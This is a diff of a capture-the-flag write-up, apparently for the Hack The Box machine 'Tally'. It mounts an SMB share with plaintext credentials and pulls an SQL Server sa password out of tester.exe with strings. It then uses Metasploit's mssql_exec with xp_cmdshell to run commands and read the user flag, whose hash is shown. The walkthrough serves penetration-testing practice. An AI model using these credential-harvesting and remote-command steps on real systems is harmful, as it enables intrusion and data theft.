@@ -110,10 +110,12 @@ CISCO : cisco : cisco123
 PDF Writer : 64257-56525-54257-54734 : 
 ```
 
+Tally Account Share!!
 
+Looks like a SMB share to me, lets check it out!
 
-=> SMB SHARE:
-smbclient -L tally.htb -U Finance
+```
+smbclient -L 10.10.10.59 -U Finance
 WARNING: The "syslog" option is deprecated
 Enter WORKGROUP\Finance's password: 
 Domain=[TALLY] OS=[Windows Server 2016 Standard 14393] Server=[Windows Server 2016 Standard 6.3]
@@ -124,15 +126,37 @@ Domain=[TALLY] OS=[Windows Server 2016 Standard 14393] Server=[Windows Server 20
 	ADMIN$          Disk      Remote Admin
 	C$              Disk      Default share
 	IPC$            IPC       Remote IPC
-Connection to tally.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-NetBIOS over TCP disabled -- no workgroup available
+```
 
+Lets mount the ACCT share
+```
+mount -t cifs -o username=Finance,password=Acc0unting //10.10.10.59/ACCT /mnt
+```
 
-=> MOUNTING THE ACCT: mount -t cifs -o username=Finance,password=Acc0unting //10.10.10.59/ACCT /mnt
-Strings zz_Migration\Binaries\New folder\tester.exe
+After a lot of scouring through the files
+
+We find a exe called tester.exe
+
+```
+root@kali:/mnt/zz_Migration/Binaries/New folder# strings tester.exe 
+...
 DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
+...
+```
 
-=>  use auxiliary/admin/mssql/mssql_exec
+Looks like SQL Creds to me xD
+
+Launchint Metasploit!
+
+**user.txt**
+
+```
+msf > use auxiliary/admin/mssql/mssql_exec
+msf auxiliary(mssql_exec) > set CMD cmd.exe /c type C:\\Users\\Sarah\\Desktop\\user.txt
+msf auxiliary(mssql_exec) > set PASSWORD GWE3V65#6KFH93@4GWTG2G 
+msf auxiliary(mssql_exec) > set RHOST 10.10.10.59
+msf auxiliary(mssql_exec) > show options
+
 Module options (auxiliary/admin/mssql/mssql_exec):
 
    Name                 Current Setting                                  Required  Description
@@ -145,8 +169,15 @@ Module options (auxiliary/admin/mssql/mssql_exec):
    USERNAME             sa                                               no        The username to authenticate as
    USE_WINDOWS_AUTHENT  false                                            yes       Use windows authentification (requires DOMAIN option set)
 
-user.txt
-be72362e8dffeca2b42406d5d1c74bb1
+msf auxiliary(mssql_exec) > run
+[*] 10.10.10.59:1433 - The server may have xp_cmdshell disabled, trying to enable it...
+[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c type C:\Users\Sarah\Desktop\user.txt'
+ output
+ ------
+ be72362e8dffeca2b42406d5d1c74bb1
+
+[*] Auxiliary module execution completed
+```
 
 
 => SHELL:
